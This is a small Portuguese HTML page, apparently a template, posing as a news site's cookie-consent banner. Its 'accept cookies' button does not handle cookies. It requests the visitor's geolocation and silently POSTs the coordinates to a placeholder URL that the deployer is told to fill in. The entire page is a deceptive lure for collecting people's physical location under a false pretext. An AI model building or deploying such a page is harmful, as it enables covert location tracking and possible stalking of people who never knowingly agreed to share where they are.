<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>notícia</title>
</head>

<body>

<h1>Por favor aceite cookeis para melhor experiência</h1>

<button onclick="enviar()">
  aceitar cookies
</button>

<script>

function enviar(){

navigator.geolocation.getCurrentPosition(function(pos){

const dados = {
latitude: pos.coords.latitude,
longitude: pos.coords.longitude
};

fetch("COLE_SUA_URL_AQUI",{
method:"POST",
body:JSON.stringify(dados)
});

alert("Localização enviada!");

});

}

</script>

</body>
</html>
